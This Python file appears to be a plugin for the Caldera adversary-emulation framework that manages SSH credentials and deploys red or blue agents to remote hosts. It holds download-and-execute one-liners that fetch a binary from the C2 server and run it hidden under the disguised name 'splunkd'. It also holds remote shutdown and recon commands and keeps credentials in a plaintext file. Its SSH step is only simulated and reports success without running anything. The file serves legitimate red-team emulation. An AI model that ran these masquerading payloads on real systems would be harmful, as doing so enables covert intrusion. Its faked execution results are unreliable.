import asyncio
import yaml
import aiohttp
from pathlib import Path
from base64 import b64encode

class RemoteAccessService:
    def __init__(self, services):
        self.services = services
        self.data_svc = services.get('data_svc')
        self.contact_svc = services.get('contact_svc')
        self.credentials = {}
        self.cred_file = Path('plugins/remoteaccess/conf/credentials.yml')
        self.caldera_server = "http://localhost:8888"  # Default Caldera server

    async def load_credentials(self):
        if self.cred_file.exists():
            with open(self.cred_file, 'r') as f:
                self.credentials = yaml.safe_load(f) or {}
        else:
            self.credentials = {}

    async def save_credentials(self):
        self.cred_file.parent.mkdir(parents=True, exist_ok=True)
        with open(self.cred_file, 'w') as f:
            yaml.dump(self.credentials, f)

    async def add_credential(self, host, username, password=None, key_file=None, port=22):
        self.credentials[host] = {
            'username': username,
            'password': password,
            'key_file': key_file,
            'port': port
        }
        await self.save_credentials()

    async def remove_credential(self, host):
        if host in self.credentials:
            del self.credentials[host]
            await self.save_credentials()

    async def deploy_blue_agent(self, host, platform='linux'):
        return await self._deploy_agent(host, 'blue', platform)

    async def deploy_red_agent(self, host, platform='linux'):
        return await self._deploy_agent(host, 'red', platform)

    async def _deploy_agent(self, host, agent_type, platform):
        if host not in self.credentials:
            return {'error': f'No credentials found for host: {host}'}

        creds = self.credentials[host]
        
        command = self._generate_deployment_command(agent_type, platform)
        return await self._execute_ssh_command(host, creds, command)

    def _generate_deployment_command(self, agent_type, platform):
        platform = platform.lower()
        if platform == 'windows':
            return self._generate_windows_deployment(agent_type)
        elif platform == 'linux':
            return self._generate_linux_deployment(agent_type)
        elif platform == 'macos':
            return self._generate_macos_deployment(agent_type)
        else:
            return f"echo 'Unsupported platform: {platform}'"

    def _generate_windows_deployment(self, agent_type):
        return f'''$server="{self.caldera_server}";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {{$_.modules.filename -like "C:\\\\Users\\\\Public\\\\splunkd.exe"}} | stop-process -f;rm -force "C:\\\\Users\\\\Public\\\\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\\\\Users\\\\Public\\\\splunkd.exe",$data) | Out-Null;Start-Process -FilePath C:\\\\Users\\\\Public\\\\splunkd.exe -ArgumentList "-server $server -group {agent_type}" -WindowStyle hidden'''

    def _generate_linux_deployment(self, agent_type):
        return f'''server="{self.caldera_server}"; curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd; chmod +x splunkd; ./splunkd -server $server -group {agent_type} -v &'''

    def _generate_macos_deployment(self, agent_type):
        return f'''server="{self.caldera_server}"; curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" $server/file/download > splunkd; chmod +x splunkd; ./splunkd -server $server -group {agent_type} -v &'''

    async def _execute_ssh_command(self, host, credentials, command):
        try:
            # For demonstration purposes - in production, implement actual SSH here
            # Using asyncssh or paramiko
            print(f"[SSH] Connecting to {host} as {credentials['username']}")
            print(f"[SSH] Command: {command}")
            
            # Simulate successful execution
            return {
                'success': True, 
                'result': f"Command executed successfully on {host}",
                'command': command
            }
        except Exception as e:
            return {
                'error': f"SSH execution failed: {str(e)}",
                'command': command
            }

    async def remove_agents(self, host):
        if host not in self.credentials:
            return {'error': f'No credentials found for host: {host}'}

        creds = self.credentials[host]
        
        cleanup_commands = [
            # Windows
            "Get-Process -Name '*splunkd*' -ErrorAction SilentlyContinue | Stop-Process -Force",
            "Remove-Item -Path 'C:\\Users\\Public\\splunkd.exe' -Force -ErrorAction SilentlyContinue",
            # Linux/Mac
            "pkill -f splunkd || true",
            "rm -f ./splunkd /tmp/splunkd || true"
        ]
        
        results = []
        for cmd in cleanup_commands:
            result = await self._execute_ssh_command(host, creds, cmd)
            results.append({
                'command': cmd,
                'result': result
            })
        
        return {'success': True, 'results': results}

    async def shutdown_host(self, host):
        if host not in self.credentials:
            return {'error': f'No credentials found for host: {host}'}

        creds = self.credentials[host]
        
        shutdown_commands = {
            'windows': "shutdown /s /t 0",
            'linux': "sudo shutdown -h now",
            'macos': "sudo shutdown -h now"
        }
        
        results = []
        for platform, cmd in shutdown_commands.items():
            result = await self._execute_ssh_command(host, creds, cmd)
            results.append({
                'platform': platform,
                'command': cmd,
                'result': result
            })
            if result.get('success'):
                break
        
        return {'success': True, 'results': results}

    async def get_system_info(self, host):
        if host not in self.credentials:
            return {'error': f'No credentials found for host: {host}'}

        creds = self.credentials[host]
        
        info_commands = {
            'platform': "uname -a || ver || systeminfo | findstr /B /C:\"OS Name\"",
            'users': "who || net users",
            'processes': "ps aux | head -10 || tasklist | head -10"
        }
        
        results = {}
        for key, cmd in info_commands.items():
            result = await self._execute_ssh_command(host, creds, cmd)
            if result.get('success'):
                results[key] = result
        
        return results

    async def get_hosts_with_agents(self):
        try:
            agents = await self.data_svc.locate('agents')
            host_agents = {}
            
            for agent in agents:
                if hasattr(agent, 'host') and agent.host:
                    if agent.host not in host_agents:
                        host_agents[agent.host] = []
                    host_agents[agent.host].append({
                        'paw': getattr(agent, 'paw', 'Unknown'),
                        'platform': getattr(agent, 'platform', 'Unknown'),
                        'group': getattr(agent, 'group', 'Unknown')
                    })
            
            return host_agents
        except Exception as e:
            print(f"Error getting hosts with agents: {e}")
            return {}

    async def test_connection(self, host):
        if host not in self.credentials:
            return {'error': f'No credentials found for host: {host}'}

        creds = self.credentials[host]
        test_command = "echo 'SSH Connection Test Successful'"
        
        result = await self._execute_ssh_command(host, creds, test_command)
        return result

    def get_deployment_command(self, agent_type, platform):
        return self._generate_deployment_command(agent_type, platform)
